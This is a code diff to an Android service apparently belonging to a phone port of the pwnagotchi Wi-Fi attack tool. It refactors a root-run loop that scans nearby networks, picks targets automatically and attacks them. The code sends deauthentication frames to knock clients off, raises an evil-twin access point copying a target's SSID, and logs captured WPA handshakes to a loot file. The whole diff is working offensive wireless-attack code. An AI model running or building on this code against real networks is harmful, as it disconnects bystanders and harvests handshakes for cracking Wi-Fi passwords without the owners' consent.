@@ -71,76 +71,72 @@ public class PwngService extends Service {
         updateNotification();
         
         handler = new Handler(Looper.getMainLooper());
-        new Thread(() -> { Looper.prepare(); new Handler().post(new ScanRunner()); Looper.loop(); }, "PwngAI").start();
+        // Start background scan loop - isRunning must be true first!
+        isRunning = true;
+        new Thread(() -> {
+            while (isRunning) {
+                doScanCycle();
+                sleep(SCAN_INTERVAL);
+            }
+        }, "PwngAI").start();
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (intent != null && "STOP".equals(intent.getAction())) {
+            isRunning = false;
             stopForeground(true); stopSelf(); return START_NOT_STICKY;
         }
-        if (!isRunning) { isRunning = true; startForeground(NOTIFY_ID, buildNotification()); }
+        startForeground(NOTIFY_ID, buildNotification());
         return START_STICKY;
     }
 
     @Override public IBinder onBind(Intent i) { return null; }
 
+    @Override
+    public void onDestroy() {
+        // Emergency WiFi recovery
+        execSu("cmd wifi stop-softap");
+        execSu("cmd wifi set-wifi-enabled enabled");
+        super.onDestroy();
+    }
+
     // ─── AI Scan Loop ──────────────────────────────────────
 
-    private class ScanRunner implements Runnable {
-        @Override
-        public void run() {
-            if (!isRunning) return;
-            
-            // Scan
-            execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " scan");
-            sleep(3500);
-            String results = execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " scan_results");
-            
-            // Parse and build knowledge
-            List<String[]> scanData = new ArrayList<>();
-            int apTot = 0, wpa2Tot = 0;
-            for (String line : results.split("\n")) {
-                if (line.startsWith("bssid") || line.trim().isEmpty()) continue;
-                String[] p = line.split("\t");
-                if (p.length < 5) continue;
-                apTot++; if (p[3].contains("WPA")) wpa2Tot++;
-                scanData.add(new String[]{p[0].trim(), p[4].trim(), p[1].trim(), p[2].trim(), p[3].trim()});
-            }
-            apCount = apTot; wpa2Count = wpa2Tot;
-
-            // Ask brain what to do
-            PwngBrain.Decision d = brain.think(apTot, wpa2Tot, scanData);
-            
-            if (d.face != null) currentFace = d.face;
-            if (d.status != null) currentStatus = d.status;
-            currentPhase = brain.getPhaseName();
-            totalPmkids = brain.getTotalPmkids();
-            totalHandshakes = brain.getTotalHandshakes();
-
-            // Execute decision
-            boolean success = false;
-            switch (d.action) {
-                case "aggressive":
-                    success = doAggressiveHunt(d.targetBssid, d.targetSsid);
-                    break;
-                case "evil_twin":
-                    success = doEvilTwin(d.targetBssid, d.targetSsid, d.targetFreq, false);
-                    break;
-                case "deauth_twin":
-                    success = doEvilTwin(d.targetBssid, d.targetSsid, d.targetFreq, true);
-                    break;
-                case "scan":
-                case "wait":
-                default:
-                    break;
-            }
-            
-            brain.reportResult(d.action, success, d.targetBssid, success ? "ok" : "fail");
-            updateNotification();
-            
-            handler.postDelayed(this, SCAN_INTERVAL);
+    private void doScanCycle() {
+        // Scan
+        execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " scan");
+        sleep(3500);
+        String results = execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " scan_results");
+        
+        List<String[]> scanData = new ArrayList<>();
+        int apTot = 0, wpa2Tot = 0;
+        for (String line : results.split("\n")) {
+            if (line.startsWith("bssid") || line.trim().isEmpty()) continue;
+            String[] p = line.split("\t");
+            if (p.length < 5) continue;
+            apTot++; if (p[3].contains("WPA")) wpa2Tot++;
+            scanData.add(new String[]{p[0].trim(), p[4].trim(), p[1].trim(), p[2].trim(), p[3].trim()});
         }
+        apCount = apTot; wpa2Count = wpa2Tot;
+
+        PwngBrain.Decision d = brain.think(apTot, wpa2Tot, scanData);
+        
+        if (d.face != null) currentFace = d.face;
+        if (d.status != null) currentStatus = d.status;
+        currentPhase = brain.getPhaseName();
+        totalPmkids = brain.getTotalPmkids();
+        totalHandshakes = brain.getTotalHandshakes();
+
+        boolean success = false;
+        switch (d.action) {
+            case "aggressive":  success = doAggressiveHunt(d.targetBssid, d.targetSsid); break;
+            case "evil_twin":   success = doEvilTwin(d.targetBssid, d.targetSsid, d.targetFreq, false); break;
+            case "deauth_twin": success = doEvilTwin(d.targetBssid, d.targetSsid, d.targetFreq, true); break;
+        }
+        
+        brain.reportResult(d.action, success, d.targetBssid, success ? "ok" : "fail");
+        updateNotification();
     }
 
     // ─── Actions ───────────────────────────────────────────
@@ -180,46 +176,62 @@ public class PwngService extends Service {
     }
 
     private boolean doEvilTwin(String bssid, String ssid, int freq, boolean deauth) {
-        if (deauth) {
-            currentStatus = "👊 deauth " + ssid;
+        try {
+            if (deauth) {
+                currentStatus = "👊 deauth " + ssid;
+                updateNotification();
+                for (int i = 0; i < 3; i++) {
+                    execSu("/data/data/com.pwnagotchi.app/deauth " + IFACE + " " + bssid +
+                           " ff:ff:ff:ff:ff:ff " + freq);
+                    sleep(200);
+                }
+            }
+            
+            // Disable all saved networks so phone doesn't auto-reconnect to home WiFi
+            execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " list_networks 2>&1 | tail -n +2 | while read line; do "
+                + "nid=\\$(echo \"\\$line\" | awk '{print \\$1}'); "
+                + "wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " disable_network \\$nid 2>/dev/null; done");
+            
+            currentStatus = "🎭 Evil Twin: " + ssid;
             updateNotification();
-            for (int i = 0; i < 3; i++) {
-                execSu("/data/data/com.pwnagotchi.app/deauth " + IFACE + " " + bssid +
-                       " ff:ff:ff:ff:ff:ff " + freq);
-                sleep(200);
+            
+            execSu("cmd wifi set-wifi-enabled disabled"); sleep(1000);
+            execSu("cmd wifi start-softap \"" + ssid.replace("\"","\\\"") + "\" wpa2 twinpass12345");
+            sleep(2000);
+            
+            boolean caught = false;
+            long start = System.currentTimeMillis();
+            while (System.currentTimeMillis() - start < 15000) {
+                String log = execSu("logcat -d -s hostapd:* 2>&1 | grep -E 'EAPOL|AP-STA-CONNECTED' | tail -3");
+                if (log.contains("AP-STA-CONNECTED") || log.contains("EAPOL")) {
+                    caught = true;
+                    try {
+                        FileWriter fw = new FileWriter(new File(lootDir, "evil_twin_handshakes.txt"), true);
+                        fw.write("[" + new java.text.SimpleDateFormat("HH:mm:ss").format(new Date())
+                            + "] " + ssid + " (" + bssid + ") HANDSHAKE\n");
+                        fw.close();
+                    } catch (Exception e) {}
+                    break;
+                }
+                sleep(3000);
             }
+            
+            if (caught) { currentFace = FACES.get("FRIEND"); currentStatus = "🎭 CAUGHT: " + ssid; }
+            else currentStatus = "🎭 no client for " + ssid;
+            return caught;
+            
+        } finally {
+            execSu("cmd wifi stop-softap");
+            sleep(1000);
+            execSu("cmd wifi set-wifi-enabled enabled");
+            sleep(2000);
+            // Re-enable all networks
+            execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " list_networks 2>&1 | tail -n +2 | while read line; do "
+                + "nid=\\$(echo \"\\$line\" | awk '{print \\$1}'); "
+                + "wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " enable_network \\$nid 2>/dev/null; done");
+            execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " reassociate");
+            updateNotification();
         }
-        
-        currentStatus = "🎭 Evil Twin: " + ssid;
-        updateNotification();
-        
-        execSu("cmd wifi set-wifi-enabled disabled"); sleep(1000);
-        execSu("cmd wifi start-softap \"" + ssid.replace("\"","\\\"") + "\" wpa2 twinpass12345");
-        sleep(3000);
-        
-        boolean caught = false;
-        long start = System.currentTimeMillis();
-        while (System.currentTimeMillis() - start < 30000) {
-            String log = execSu("logcat -d -s hostapd:* 2>&1 | grep -E 'EAPOL|AP-STA-CONNECTED' | tail -3");
-            if (log.contains("AP-STA-CONNECTED") || log.contains("EAPOL")) {
-                caught = true;
-                try {
-                    FileWriter fw = new FileWriter(new File(lootDir, "evil_twin_handshakes.txt"), true);
-                    fw.write("[" + new java.text.SimpleDateFormat("HH:mm:ss").format(new Date())
-                        + "] " + ssid + " (" + bssid + ") HANDSHAKE\n");
-                    fw.close();
-                } catch (Exception e) {}
-                break;
-            }
-            sleep(3000);
-        }
-        
-        execSu("cmd wifi stop-softap"); sleep(1000);
-        execSu("cmd wifi set-wifi-enabled enabled"); sleep(3000);
-        
-        if (caught) { currentFace = FACES.get("FRIEND"); currentStatus = "🎭 CAUGHT: " + ssid; }
-        else currentStatus = "🎭 no client for " + ssid;
-        return caught;
     }
 
     // ─── PMKID ─────────────────────────────────────────────
